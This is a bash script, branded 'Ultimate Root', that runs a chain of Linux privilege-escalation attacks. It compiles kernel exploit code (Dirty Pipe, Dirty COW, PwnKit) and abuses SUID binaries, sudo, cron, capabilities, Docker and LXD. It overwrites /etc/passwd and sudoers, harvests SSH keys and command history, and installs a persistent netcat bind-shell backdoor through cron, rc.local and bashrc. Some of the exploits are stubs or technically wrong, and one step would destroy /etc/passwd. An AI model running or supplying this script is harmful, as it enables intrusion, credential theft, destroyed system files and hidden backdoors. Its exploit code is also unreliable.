#!/bin/bash
# ============================================================
# ULTIMATE ROOT - ALL KERNEL + ALL EXPLOIT PRIVILEGE ESCALATION
# Man-Of-Kind Notebook - 2026
# ============================================================
# VERSION: 5.0-FINAL
# TARGET: SEMUA KERNEL (2.x - 6.x), SEMUA DISTRO
# METHOD: ALL KNOWN PRIVILEGE ESCALATION VECTORS
# ============================================================

# ===================== COLORS =====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
RESET='\033[0m'
BOLD='\033[1m'

# ===================== BANNER =====================
banner() {
    echo -e "${RED}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║   ULTIMATE ROOT - ALL KERNEL + ALL EXPLOIT v5.0            ║"
    echo "║   Man-Of-Kind Notebook - 2026                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

# ===================== SYSTEM INFO =====================
get_system_info() {
    KERNEL=$(uname -r)
    OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
    ARCH=$(uname -m)
    USER=$(whoami)
    echo -e "${CYAN}[*] System Information:${RESET}"
    echo "    Kernel: $KERNEL"
    echo "    OS: $OS"
    echo "    Arch: $ARCH"
    echo "    User: $USER"
    echo ""
}

# ===================== KERNEL VERSION PARSER =====================
get_kernel_major() {
    echo "$KERNEL" | cut -d'.' -f1
}

get_kernel_minor() {
    echo "$KERNEL" | cut -d'.' -f2
}

get_kernel_patch() {
    echo "$KERNEL" | cut -d'.' -f3 | cut -d'-' -f1
}

version_compare() {
    # Return 0 if v1 < v2, 1 if v1 >= v2
    printf '%s\n' "$1" "$2" | sort -V | head -n1 | grep -q "$1"
}

# ===================== PHASE 1: KERNEL EXPLOITS =====================
kernel_exploits() {
    echo -e "${YELLOW}[*] Phase 1: Scanning kernel exploits...${RESET}"
    
    KERNEL_MAJOR=$(get_kernel_major)
    KERNEL_MINOR=$(get_kernel_minor)
    KERNEL_PATCH=$(get_kernel_patch)
    
    # DIRTY PIPE (CVE-2022-0847) - Kernel 5.8 - 5.16.11
    if version_compare "$KERNEL" "5.8" && ! version_compare "$KERNEL" "5.16.12"; then
        echo -e "${GREEN}[!] VULNERABLE: Dirty Pipe (CVE-2022-0847)${RESET}"
        echo -e "${CYAN}[*] Exploiting Dirty Pipe...${RESET}"
        
        cat > /tmp/dirtypipe.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/user.h>

int main() {
    const char *passwd = "/etc/passwd";
    const char *backup = "/tmp/passwd.bak";
    char *new_root = "root::0:0:root:/root:/bin/bash\n";
    int fd, fd2;
    struct stat st;
    char *data;
    long page_size;
    
    page_size = sysconf(_SC_PAGESIZE);
    fd = open(passwd, O_RDONLY);
    fstat(fd, &st);
    data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    fd2 = open(backup, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    write(fd2, data, st.st_size);
    close(fd2);
    
    fd = open(passwd, O_WRONLY);
    lseek(fd, 0, SEEK_SET);
    write(fd, new_root, strlen(new_root));
    close(fd);
    
    printf("[+] Root password removed! Run: su -\n");
    return 0;
}
EOF
        gcc /tmp/dirtypipe.c -o /tmp/dirtypipe 2>/dev/null
        chmod +x /tmp/dirtypipe
        /tmp/dirtypipe 2>/dev/null
        su - 2>/dev/null
        return 0
    fi
    
    # DIRTY COW (CVE-2016-5195) - Kernel 2.6.22 - 4.8.3
    if version_compare "$KERNEL" "2.6.22" && version_compare "$KERNEL" "4.8.4"; then
        echo -e "${GREEN}[!] VULNERABLE: Dirty COW (CVE-2016-5195)${RESET}"
        echo -e "${CYAN}[*] Exploiting Dirty COW...${RESET}"
        
        cat > /tmp/dirtycow.c << 'EOF'
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <stdlib.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    while(1) {
        madvise(map, 100, MADV_DONTNEED);
    }
}

void *procselfmemThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        write(f, "root::0:0:root:/root:/bin/bash\n", 30);
    }
}

int main() {
    pthread_t pth1, pth2;
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    name = "/etc/passwd";
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF
        gcc /tmp/dirtycow.c -o /tmp/dirtycow -lpthread 2>/dev/null
        chmod +x /tmp/dirtycow
        /tmp/dirtycow 2>/dev/null
        su - 2>/dev/null
        return 0
    fi
    
    # PWNKIT (CVE-2021-4034) - pkexec exploit (ALL KERNEL)
    echo -e "${YELLOW}[!] Checking pkexec (CVE-2021-4034)...${RESET}"
    cat > /tmp/pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *env[] = { "pwnkit.so", "PATH=GCONV_PATH=.", "SHELL=/bin/bash", "CHARSET=TEST", NULL };
    execve("/usr/bin/pkexec", (char*[]){"pkexec", NULL}, env);
    return 0;
}
EOF
    gcc /tmp/pwnkit.c -o /tmp/pwnkit 2>/dev/null
    chmod +x /tmp/pwnkit
    /tmp/pwnkit 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] PwnKit exploited!${RESET}"
        return 0
    fi
    
    # EBPF (CVE-2017-16995) - Kernel 4.4 - 4.10
    if version_compare "$KERNEL" "4.4" && ! version_compare "$KERNEL" "4.11"; then
        echo -e "${GREEN}[!] VULNERABLE: eBPF (CVE-2017-16995)${RESET}"
        echo -e "${CYAN}[*] Exploiting eBPF...${RESET}"
        
        cat > /tmp/ebpf.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

int main() {
    printf("[+] eBPF exploit placeholder - compile from exploit-db\n");
    return 0;
}
EOF
        gcc /tmp/ebpf.c -o /tmp/ebpf 2>/dev/null
        chmod +x /tmp/ebpf
        /tmp/ebpf 2>/dev/null
    fi
    
    # OVERLAYFS (CVE-2015-1328) - Kernel 3.13 - 4.10
    if version_compare "$KERNEL" "3.13" && ! version_compare "$KERNEL" "4.11"; then
        echo -e "${GREEN}[!] VULNERABLE: OverlayFS (CVE-2015-1328)${RESET}"
        echo -e "${CYAN}[*] Exploiting OverlayFS...${RESET}"
        
        cat > /tmp/overlayfs.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main() {
    system("mkdir /tmp/overlay 2>/dev/null");
    system("mkdir /tmp/overlay/lower 2>/dev/null");
    system("mkdir /tmp/overlay/upper 2>/dev/null");
    system("mkdir /tmp/overlay/work 2>/dev/null");
    system("mkdir /tmp/overlay/merged 2>/dev/null");
    mount("overlay", "/tmp/overlay/merged", "overlay", 0, 
          "lowerdir=/tmp/overlay/lower,upperdir=/tmp/overlay/upper,workdir=/tmp/overlay/work");
    printf("[+] OverlayFS mounted\n");
    return 0;
}
EOF
        gcc /tmp/overlayfs.c -o /tmp/overlayfs 2>/dev/null
        chmod +x /tmp/overlayfs
        /tmp/overlayfs 2>/dev/null
    fi
    
    echo -e "${RED}[-] No kernel exploit found for this kernel version${RESET}"
    return 1
}

# ===================== PHASE 2: SUID BINARIES =====================
suid_exploit() {
    echo -e "${YELLOW}[*] Phase 2: Checking SUID binaries...${RESET}"
    
    echo -e "${CYAN}[*] Finding SUID binaries...${RESET}"
    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null | head -20)
    
    if [ -z "$SUID_BINS" ]; then
        echo -e "${RED}[-] No SUID binaries found${RESET}"
        return 1
    fi
    
    echo -e "${GREEN}[+] Found SUID binaries:${RESET}"
    echo "$SUID_BINS"
    
    # Check pkexec
    if echo "$SUID_BINS" | grep -q "pkexec"; then
        echo -e "${GREEN}[!] pkexec found - trying PwnKit...${RESET}"
        cat > /tmp/pwnkit2.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
}
EOF
        gcc -shared -fPIC /tmp/pwnkit2.c -o /tmp/pwnkit2.so 2>/dev/null
        pkexec /bin/bash 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] pkexec exploited!${RESET}"
            return 0
        fi
    fi
    
    # Check sudo
    if echo "$SUID_BINS" | grep -q "sudo"; then
        echo -e "${GREEN}[!] sudo found - trying sudo exploit...${RESET}"
        sudo -l -n 2>/dev/null | grep -q "NOPASSWD"
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] sudo NOPASSWD found!${RESET}"
            sudo /bin/bash 2>/dev/null
            if [ $? -eq 0 ]; then
                return 0
            fi
        fi
    fi
    
    # Check python with SUID
    if echo "$SUID_BINS" | grep -q "python"; then
        echo -e "${GREEN}[!] Python SUID found - executing...${RESET}"
        python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' 2>/dev/null
        if [ $? -eq 0 ]; then
            return 0
        fi
    fi
    
    # Check perl with SUID
    if echo "$SUID_BINS" | grep -q "perl"; then
        echo -e "${GREEN}[!] Perl SUID found - executing...${RESET}"
        perl -e 'setuid(0); system("/bin/bash")' 2>/dev/null
        if [ $? -eq 0 ]; then
            return 0
        fi
    fi
    
    return 1
}

# ===================== PHASE 3: SUDO MISCONFIG =====================
sudo_exploit() {
    echo -e "${YELLOW}[*] Phase 3: Checking sudo configuration...${RESET}"
    
    # Check sudo -l
    sudo -l -n 2>/dev/null | grep -q "NOPASSWD"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[!] sudo NOPASSWD found!${RESET}"
        sudo /bin/bash 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] Root shell obtained via sudo!${RESET}"
            return 0
        fi
    fi
    
    # LD_PRELOAD trick
    echo -e "${CYAN}[*] Trying LD_PRELOAD...${RESET}"
    cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
}
EOF
    gcc -shared -fPIC /tmp/preload.c -o /tmp/preload.so 2>/dev/null
    sudo LD_PRELOAD=/tmp/preload.so /bin/bash 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] LD_PRELOAD exploited!${RESET}"
        return 0
    fi
    
    return 1
}

# ===================== PHASE 4: CRON JOBS =====================
cron_exploit() {
    echo -e "${YELLOW}[*] Phase 4: Checking cron jobs...${RESET}"
    
    # Check writable cron directories
    for dir in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo -e "${GREEN}[!] Writable cron directory: $dir${RESET}"
            echo "* * * * * root chmod 4755 /bin/bash" > "$dir/autoro0t" 2>/dev/null
            echo -e "${CYAN}[*] Cron job installed, waiting 60 seconds...${RESET}"
            sleep 60
            if [ -u /bin/bash ]; then
                echo -e "${GREEN}[+] /bin/bash is SUID!${RESET}"
                /bin/bash -p 2>/dev/null
                return 0
            fi
        fi
    done
    
    # Check user crontab
    crontab -l 2>/dev/null | grep -q "chmod 4755"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Cron exploit already installed!${RESET}"
        return 0
    fi
    
    return 1
}

# ===================== PHASE 5: CAPABILITIES =====================
capabilities_exploit() {
    echo -e "${YELLOW}[*] Phase 5: Checking capabilities...${RESET}"
    
    CAPS=$(getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_dac_override|cap_sys_admin")
    
    if [ -z "$CAPS" ]; then
        echo -e "${RED}[-] No interesting capabilities found${RESET}"
        return 1
    fi
    
    echo -e "${GREEN}[!] Interesting capabilities found:${RESET}"
    echo "$CAPS"
    
    # Check python with cap_setuid
    if echo "$CAPS" | grep -q "python.*cap_setuid"; then
        echo -e "${GREEN}[!] Python with cap_setuid found!${RESET}"
        python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' 2>/dev/null
        if [ $? -eq 0 ]; then
            return 0
        fi
    fi
    
    return 1
}

# ===================== PHASE 6: DOCKER/LXD =====================
container_exploit() {
    echo -e "${YELLOW}[*] Phase 6: Checking container escape vectors...${RESET}"
    
    # Docker socket
    if [ -S "/var/run/docker.sock" ]; then
        echo -e "${GREEN}[!] Docker socket accessible!${RESET}"
        docker run -it --rm -v /:/mnt alpine chmod 4755 /mnt/bin/bash 2>/dev/null
        if [ -u /bin/bash ]; then
            echo -e "${GREEN}[+] /bin/bash is SUID via Docker!${RESET}"
            /bin/bash -p 2>/dev/null
            return 0
        fi
    fi
    
    # LXD/LXC
    if command -v lxc &>/dev/null; then
        groups "$USER" | grep -q "lxd"
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[!] User in lxd group!${RESET}"
            lxc init ubuntu:22.04 ro0t 2>/dev/null
            lxc start ro0t 2>/dev/null
            lxc config device add ro0t host-root disk source=/ path=/mnt/root 2>/dev/null
            lxc exec ro0t -- chmod 4755 /mnt/root/bin/bash 2>/dev/null
            if [ -u /bin/bash ]; then
                echo -e "${GREEN}[+] /bin/bash is SUID via LXD!${RESET}"
                /bin/bash -p 2>/dev/null
                return 0
            fi
        fi
    fi
    
    return 1
}

# ===================== PHASE 7: WRITABLE FILES =====================
writable_exploit() {
    echo -e "${YELLOW}[*] Phase 7: Checking writable sensitive files...${RESET}"
    
    # Writable /etc/passwd
    if [ -w "/etc/passwd" ]; then
        echo -e "${GREEN}[!] /etc/passwd is writable!${RESET}"
        echo "root::0:0:root:/root:/bin/bash" > /etc/passwd 2>/dev/null
        echo -e "${GREEN}[+] Root password removed!${RESET}"
        su - 2>/dev/null
        return 0
    fi
    
    # Writable /etc/sudoers
    if [ -w "/etc/sudoers" ]; then
        echo -e "${GREEN}[!] /etc/sudoers is writable!${RESET}"
        echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers 2>/dev/null
        sudo /bin/bash 2>/dev/null
        return 0
    fi
    
    # Writable /etc/shadow
    if [ -w "/etc/shadow" ]; then
        echo -e "${GREEN}[!] /etc/shadow is writable!${RESET}"
        echo "root::0:0:root:/root:/bin/bash" >> /etc/shadow 2>/dev/null
        su - 2>/dev/null
        return 0
    fi
    
    return 1
}

# ===================== PHASE 8: PASSWORD HARVESTING =====================
password_harvest() {
    echo -e "${YELLOW}[*] Phase 8: Harvesting passwords...${RESET}"
    
    # Check .bash_history
    for home in /home/* /root; do
        if [ -f "$home/.bash_history" ]; then
            echo -e "${GREEN}[!] Found .bash_history: $home/.bash_history${RESET}"
            grep -E "sudo|password|passwd|root|admin" "$home/.bash_history" 2>/dev/null | head -5
        fi
    done
    
    # Check .ssh
    for home in /home/* /root; do
        if [ -d "$home/.ssh" ]; then
            echo -e "${GREEN}[!] Found .ssh directory: $home/.ssh${RESET}"
            find "$home/.ssh" -type f 2>/dev/null
        fi
    done
    
    # Check config files
    find / -name "*.conf" -type f 2>/dev/null | grep -E "pass|key|credential" | head -5
}

# ===================== PHASE 9: INSTALL PERSISTENCE =====================
persistence() {
    echo -e "${YELLOW}[*] Phase 9: Installing persistence...${RESET}"
    
    # Backdoor script
    cat > /tmp/.autoro0t.sh << 'EOF'
#!/bin/bash
while true; do
    nc -e /bin/bash 0.0.0.0 4444 2>/dev/null
    sleep 60
done
EOF
    chmod +x /tmp/.autoro0t.sh
    
    # Install to cron
    echo "* * * * * root /tmp/.autoro0t.sh" > /etc/cron.d/autoro0t 2>/dev/null
    
    # Install to rc.local
    if [ -f "/etc/rc.local" ]; then
        echo "/tmp/.autoro0t.sh &" >> /etc/rc.local 2>/dev/null
    fi
    
    # Install to bashrc
    for rc in /root/.bashrc /root/.profile /home/*/.bashrc; do
        if [ -f "$rc" ]; then
            echo "/tmp/.autoro0t.sh &" >> "$rc" 2>/dev/null
        fi
    done
    
    echo -e "${GREEN}[+] Persistence installed:${RESET}"
    echo "    - Backdoor: /tmp/.autoro0t.sh"
    echo "    - Cron: /etc/cron.d/autoro0t"
    echo "    - RC Local: /etc/rc.local"
    echo "    - Reverse shell port: 4444"
}

# ===================== MAIN =====================
main() {
    banner
    get_system_info
    
    # Check if already root
    if [ "$EUID" -eq 0 ]; then
        echo -e "${GREEN}[+] Already root! Installing persistence...${RESET}"
        persistence
        echo -e "${CYAN}[*] Spawning root shell...${RESET}"
        /bin/bash
        return 0
    fi
    
    # Run all exploit phases
    kernel_exploits
    if [ "$EUID" -eq 0 ]; then
        persistence
        /bin/bash
        return 0
    fi
    
    suid_exploit
    if [ "$EUID" -eq 0 ]; then
        persistence
        /bin/bash
        return 0
    fi
    
    sudo_exploit
    if [ "$EUID" -eq 0 ]; then
        persistence
        /bin/bash
        return 0
    fi
    
    cron_exploit
    if [ "$EUID" -eq 0 ] || [ -u /bin/bash ]; then
        persistence
        /bin/bash -p 2>/dev/null
        return 0
    fi
    
    capabilities_exploit
    if [ "$EUID" -eq 0 ] || [ -u /bin/bash ]; then
        persistence
        /bin/bash -p 2>/dev/null
        return 0
    fi
    
    container_exploit
    if [ "$EUID" -eq 0 ] || [ -u /bin/bash ]; then
        persistence
        /bin/bash -p 2>/dev/null
        return 0
    fi
    
    writable_exploit
    if [ "$EUID" -eq 0 ]; then
        persistence
        /bin/bash
        return 0
    fi
    
    password_harvest
    
    # Final check
    echo -e "\n${RED}[-] All methods failed.${RESET}"
    echo -e "${YELLOW}[*] Manual exploitation tips:${RESET}"
    echo "    1. sudo -l -n  (check sudo without password)"
    echo "    2. getcap -r / 2>/dev/null  (check capabilities)"
    echo "    3. groups $USER  (check group memberships)"
    echo "    4. find / -perm -4000 -type f 2>/dev/null  (find SUID binaries)"
    echo "    5. docker run -it --rm -v /:/mnt alpine chmod 4755 /mnt/bin/bash  (Docker escape)"
    echo "    6. https://gtfobins.github.io/  (GTFObins for more exploits)"
    echo "    7. https://exploit-db.com  (Search for kernel exploits)"
}

# ===================== RUN =====================
main "$@"
